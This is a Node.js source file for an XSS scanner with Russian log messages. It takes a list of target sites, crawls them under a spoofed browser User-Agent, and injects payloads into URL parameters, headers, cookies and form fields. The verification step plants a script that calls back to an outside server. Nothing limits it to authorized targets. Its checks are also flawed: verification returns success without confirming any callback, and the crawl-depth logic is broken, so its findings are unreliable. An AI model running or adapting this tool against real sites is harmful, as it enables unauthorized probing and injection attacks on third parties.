const fs = require('fs');
const path = require('path');
const axios = require('axios');
const cheerio = require('cheerio');
const { URL } = require('url');
const { default: pLimit } = require('p-limit');
const retry = require('async-retry');

const CONFIG = {
    payloadsFile: 'payloads.txt',
    targetsFile: 'url.txt',
    logDir: 'log',
    commonPaths: ['/', '/search', '/index.php', '/catalog', '/blog', '/products', '/news', '/admin', '/login', '/register'],
    commonParams: ['q', 's', 'search', 'query', 'term', 'id', 'item', 'page', 'input', 'keywords', 'txt', 'user', 'password'],
    concurrencyLimitPerSite: 5,
    timeout: 30000,
    maxCrawlDepth: 3,
    verificationServer: null,
    customHeaders: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    },
    retryAttempts: 3,
    retryFactor: 2,
    retryMinTimeout: 1000,
    retryMaxTimeout: 5000
};

const payloads = fs.readFileSync(CONFIG.payloadsFile, 'utf-8').split('\n').filter(Boolean);
const targets = fs.readFileSync(CONFIG.targetsFile, 'utf-8').split('\n').filter(Boolean);

if (!fs.existsSync(CONFIG.logDir)) {
    fs.mkdirSync(CONFIG.logDir, { recursive: true });
}

function getRunLogDir() {
    let counter = 1;
    const runLogDirBase = path.join(CONFIG.logDir);
    while (fs.existsSync(path.join(runLogDirBase, `log ${counter}`))) {
        counter++;
    }
    return path.join(runLogDirBase, `log ${counter}`);
}

const currentRunLogDir = getRunLogDir();
if (!fs.existsSync(currentRunLogDir)) {
    fs.mkdirSync(currentRunLogDir, { recursive: true });
}

function getSiteLogDir(baseUrl) {
    const hostname = new URL(baseUrl).hostname.replace(/[^a-zA-Z0-9.]/g, '_');
    return path.join(currentRunLogDir, hostname);
}

function getLogFileName() {
    return `log_${Date.now()}.txt`;
}

const allFindings = {};
let findingsCount = 0;

function logToFile(logPath, message) {
    fs.appendFileSync(logPath, `${message}\n`);
}

async function verifyXss(url, param, method = 'GET', postData = null, timeout = CONFIG.timeout) {
    if (!CONFIG.verificationServer) {
        return true;
    }

    const uniqueId = Date.now();
    const verificationPayload = `<script>fetch('${CONFIG.verificationServer}/xss_probe_${uniqueId}')</script>`;
    
    let testUrl = url;
    let requestOptions = {
        method: method,
        timeout: timeout,
        headers: CONFIG.customHeaders,
    };

    if (method === 'GET') {
        testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(verificationPayload)}`;
        requestOptions.url = testUrl;
    } else if (method === 'POST') {
        requestOptions.url = url;
        requestOptions.headers = { ...CONFIG.customHeaders, 'Content-Type': 'application/x-www-form-urlencoded' };
        requestOptions.data = postData ? `${postData}&${param}=${encodeURIComponent(verificationPayload)}` : `${param}=${encodeURIComponent(verificationPayload)}`;
    }

    try {
        await axios(requestOptions);
        console.log(`🔬 Проверка XSS на ${url} (${method}) с ID: ${uniqueId}. Ожидаем коллбэк на ${CONFIG.verificationServer}...`);
        
        return true; 
    } catch (error) {
        console.error(`Ошибка при отправке пробника для верификации XSS: ${error.message}`);
        return false;
    }
}

async function logFinding(baseUrl, siteLogDir, data) {
    const logPath = path.join(siteLogDir, getLogFileName());
    const timestamp = new Date().toISOString();
    const fullUrlWithPayload = data.method === 'GET'
        ? `${data.url}${data.url.includes('?') ? '&' : '?'}${data.param}=${encodeURIComponent(data.payload)}`
        : `${data.url} (POST data: ${data.postData || 'N/A'}, Param: ${data.param} with Payload)`;

    const logMessage = `
===============================================================================
[${timestamp}] Найдена XSS уязвимость
===============================================================================
Сайт:     ${baseUrl}
Тип:      ${data.type}
URL:      ${data.url}
Параметр: ${data.param || 'N/A'}
Payload:  ${data.payload}
Метод:    ${data.method}
-------------------------------------------------------------------------------
ПОЛНЫЙ URL + PAYLOAD ДЛЯ ТЕСТИРОВАНИЯ: ${fullUrlWithPayload}
-------------------------------------------------------------------------------
`;
    if (!allFindings[baseUrl]) {
        allFindings[baseUrl] = [];
    }
    allFindings[baseUrl].push({ ...data, timestamp });
    findingsCount++;
    console.log(`[+] Найдено XSS: ${findingsCount} (${data.url})`);
    logToFile(logPath, logMessage);
}

async function crawlLinks(baseUrl, depth, visitedUrls, queue, timeout) {
    if (depth > CONFIG.maxCrawlDepth || visitedUrls.has(baseUrl)) return;
    visitedUrls.add(baseUrl);
    queue.add(baseUrl);

    try {
        const res = await axios.get(baseUrl, { timeout: timeout, headers: CONFIG.customHeaders });
        const $ = cheerio.load(res.data);
        const baseHost = new URL(baseUrl).host;

        $('a[href]').each((_, a) => {
            let href = $(a).attr('href');
            if (!href) return;

            try {
                const url = new URL(href, baseUrl);
                if (url.host === baseHost && !visitedUrls.has(url.href.split('#')[0])) {
                    queue.add(url.href.split('#')[0]);
                }
            } catch (e) { }
        });
    } catch (error) {
        const siteLogDir = getSiteLogDir(baseUrl);
        const logPath = path.join(siteLogDir, getLogFileName());
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] ⚠️ [${baseUrl}] Ошибка при краулинге ${baseUrl}: ${error.message}\n`;
        console.error(errorMessage);
        logToFile(logPath, errorMessage);
    } finally {
        queue.delete(baseUrl);
    }
}

async function fetchForms(url, timeout) {
    try {
        const res = await axios.get(url, { timeout: timeout, headers: CONFIG.customHeaders });
        const $ = cheerio.load(res.data);
        const forms = [];

        $('form').each((_, form) => {
            const action = $(form).attr('action') || url;
            const method = ($(form).attr('method') || 'get').toLowerCase();
            const inputs = [];

            $(form).find('input[name],textarea[name],select[name]').each((_, i) => {
                const name = $(i).attr('name');
                if (name) inputs.push(name);
            });

            forms.push({ action, method, inputs });
        });

        return forms;
    } catch (error) {
        const siteLogDir = getSiteLogDir(url);
        const logPath = path.join(siteLogDir, getLogFileName());
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] ⚠️ [${new URL(url).hostname}] Ошибка при получении форм с ${url}: ${error.message}\n`;
        console.error(errorMessage);
        logToFile(logPath, errorMessage);
        return [];
    }
}

async function testUrlParam(baseUrl, siteLogDir, url, param, payload, method = 'GET', timeout) {
    let targetUrl = url;
    let postData = null;

    if (method === 'GET') {
        targetUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
    } else if (method === 'POST') {
        postData = `${param}=${encodeURIComponent(payload)}`;
    }

    try {
        const options = {
            method: method,
            url: targetUrl,
            timeout: timeout,
            headers: { ...CONFIG.customHeaders, 'Content-Type': 'application/x-www-form-urlencoded' }
        };
        if (postData) {
            options.data = postData;
        }

        const res = await axios(options);
        if (res.data && res.data.includes(payload)) {
            console.log(`[!] Потенциальная XSS найдена (отражение) на ${url} через параметр ${param} с пейлоадом ${payload}.`);
            if (await verifyXss(url, param, method, postData)) {
                logFinding(baseUrl, siteLogDir, { type: 'url_param', url: targetUrl, payload, method, vulnerable: true, param });
                return true;
            }
        }
    } catch (error) {
    }
    return false;
}

async function testHeaders(baseUrl, siteLogDir, url, payload, timeout) {
    const headersToTest = {
        'User-Agent': payload,
        'Referer': payload,
        'Cookie': `session=${encodeURIComponent(payload)}`,
        'X-Forwarded-For': payload
    };

    for (const [key, val] of Object.entries(headersToTest)) {
        try {
            const res = await axios.get(url, { headers: { ...CONFIG.customHeaders, [key]: val }, timeout: timeout });
            if (res.data && res.data.includes(payload)) {
                   console.log(`[!] Потенциальная XSS найдена (отражение) на ${url} через заголовок ${key} с пейлоадом ${payload}.`);
                if (await verifyXss(url, key, 'GET', null)) {
                    logFinding(baseUrl, siteLogDir, { type: `header_${key}`, url, payload, method: 'GET', vulnerable: true, param: key });
                }
            }
        } catch (error) {
        }
    }
}

async function testForm(baseUrl, siteLogDir, form, payload, currentUrl, timeout) {
    try {
        const targetUrl = form.action.startsWith('http')
            ? form.action
            : new URL(form.action, currentUrl).href;

        const data = {};
        let vulnerableParam = null;
        let res;
        let postDataString = null;

        if (form.method === 'post') {
            for (const inputName of form.inputs) {
                data[inputName] = payload;
            }
            postDataString = new URLSearchParams(data).toString();
            res = await axios.post(targetUrl, postDataString, {
                headers: { ...CONFIG.customHeaders, 'Content-Type': 'application/x-www-form-urlencoded' },
                timeout: timeout
            });
            if (res.data && res.data.includes(payload)) {
                console.log(`[!] Потенциальная XSS найдена (отражение) на форме ${targetUrl} (POST) через поля ${form.inputs.join(',')} с пейлоадом ${payload}.`);
                vulnerableParam = form.inputs.join(',');
                if (await verifyXss(targetUrl, vulnerableParam, 'POST', postDataString)) {
                    logFinding(baseUrl, siteLogDir, { type: 'post_form', url: targetUrl, payload, method: 'POST', vulnerable: true, param: vulnerableParam, postData: postDataString });
                }
            }
        } else {
            for (const inputName of form.inputs) {
                data[inputName] = payload;
            }
            const qs = Object.entries(data)
                .map(([k, v]) => `${k}=${encodeURIComponent(v)}`)
                .join('&');
            res = await axios.get(`${targetUrl}?${qs}`, { headers: CONFIG.customHeaders, timeout: timeout });
            if (res.data && res.data.includes(payload)) {
                console.log(`[!] Потенциальная XSS найдена (отражение) на форме ${targetUrl} (GET) через поля ${form.inputs.join(',')} с пейлоадом ${payload}.`);
                const parsedUrl = new URL(`${targetUrl}?${qs}`);
                vulnerableParam = parsedUrl.searchParams.keys().find(key => form.inputs.includes(key));
                if (await verifyXss(`${targetUrl}?${qs}`, vulnerableParam, 'GET')) {
                    logFinding(baseUrl, siteLogDir, { type: 'get_form', url: `${targetUrl}?${qs}`, payload, method: 'GET', vulnerable: true, param: vulnerableParam });
                }
            }
        }
    } catch (error) {
        const siteLogDir = getSiteLogDir(currentUrl);
        const logPath = path.join(siteLogDir, getLogFileName());
        const timestamp = new Date().toISOString();
        const errorMessage = `[${timestamp}] ⚠️ [${new URL(currentUrl).hostname}] Ошибка при тестировании формы: ${error.message}\n`;
        console.error(errorMessage);
        logToFile(logPath, errorMessage);
    }
    return false;
}

async function scanUrl(baseUrl, siteLogDir, url, timeout, limitFn) {
    for (const pathPart of CONFIG.commonPaths) {
        for (const param of CONFIG.commonParams) {
            for (const payload of payloads) {
                limitFn(() => testUrlParam(baseUrl, siteLogDir, url, param, payload, 'GET', timeout));
                limitFn(() => testUrlParam(baseUrl, siteLogDir, url + pathPart, param, payload, 'POST', timeout));
            }
        }
    }

    for (const payload of payloads) {
        limitFn(() => testHeaders(baseUrl, siteLogDir, url, payload, timeout));
    }

    const forms = await fetchForms(url, timeout);
    for (const form of forms) {
        for (const payload of payloads) {
            limitFn(() => testForm(baseUrl, siteLogDir, form, payload, url, timeout));
        }
    }
}

async function scanSite(base) {
    const siteLogDir = getSiteLogDir(base);
    if (!fs.existsSync(siteLogDir)) {
        fs.mkdirSync(siteLogDir, { recursive: true });
    }
    const limitFn = pLimit(CONFIG.concurrencyLimitPerSite);
    const visitedUrls = new Set();
    const queue = new Set();
    queue.add(base);

    console.log(`\n🔎 Начинаю сканирование сайта: ${base} (Логи в: ${siteLogDir})`);
    const logPathStart = path.join(siteLogDir, getLogFileName());
    const timestampStart = new Date().toISOString();
    logToFile(logPathStart, `[${timestampStart}] 🔎 Начинаю сканирование сайта: ${base}\n`);

    while (queue.size > 0) {
        const currentUrl = Array.from(queue)[0];
        queue.delete(currentUrl);

        await retry(
            async () => {
                await crawlLinks(currentUrl, Array.from(visitedUrls).filter(url => url.startsWith(base)).length, visitedUrls, queue, CONFIG.timeout);
            },
            {
                retries: CONFIG.retryAttempts,
                factor: CONFIG.retryFactor,
                minTimeout: CONFIG.retryMinTimeout,
                maxTimeout: CONFIG.retryMaxTimeout
            }
        );

        await retry(
            async () => {
                await scanUrl(base, siteLogDir, currentUrl, CONFIG.timeout, limitFn);
            },
            {
                retries: CONFIG.retryAttempts,
                factor: CONFIG.retryFactor,
                minTimeout: CONFIG.retryMinTimeout,
                maxTimeout: CONFIG.retryMaxTimeout
            }
        );
    }

    console.log(`✅ Завершено сканирование сайта: ${base}`);
    const logPathEnd = path.join(siteLogDir, getLogFileName());
    const timestampEnd = new Date().toISOString();
    logToFile(logPathEnd, `\n[${timestampEnd}] ✅ Завершено сканирование сайта: ${base}\n`);
}

(async () => {
    try {
        console.log('🚀 Запуск сканера XSS уязвимостей');
        console.log(`🔧 Настроено ${payloads.length} payloads и ${targets.length} целей`);
        console.log(`⚙️ Параллельных запросов на сайт: ${CONFIG.concurrencyLimitPerSite}, Таймаут: ${CONFIG.timeout}ms, Глубина краулинга: ${CONFIG.maxCrawlDepth}`);
        if (CONFIG.verificationServer) {
            console.log(`🔗 Сервер для верификации: ${CONFIG.verificationServer} (Используется для подтверждения выполнения XSS!)`);
        } else {
            console.log(`⚠️ Сервер для верификации XSS не указан. Обнаружение будет основываться только на отражении пейлоада, что может давать ложные срабатывания.`);
            console.log(`    Для более точной верификации укажите 'verificationServer' в CONFIG.`);
        }
        console.log(`📁 Логи будут сохранены в папках вида 'log N' -> 'домен сайта' -> 'log_timestamp.txt' в: ${CONFIG.logDir}\n`);

        const scanPromises = targets.map(site => scanSite(site));
        await Promise.all(scanPromises);

        console.log(`\n🎉 Сканирование завершено!`);
        console.log(`📊 Всего найдено ${findingsCount} XSS уязвимостей.`);
        console.log(`📁 Результаты сохранены в: ${CONFIG.logDir}`);
    } catch (error) {
        console.error(`💥 Критическая ошибка: ${error.message}`);
    }
})();